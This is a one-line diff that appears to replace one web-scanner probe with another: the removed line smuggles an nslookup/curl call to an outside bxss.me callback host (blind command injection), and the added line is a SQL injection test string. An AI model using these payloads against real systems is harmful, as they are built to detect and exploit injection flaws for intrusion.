@@ -1,1 +1,1 @@
-(nslookup -q=cname hitmpbprpujmrda550.bxss.me||curl hitmpbprpujmrda550.bxss.me))
+-1' OR 2+644-644-1=0+0+0+1 -- 
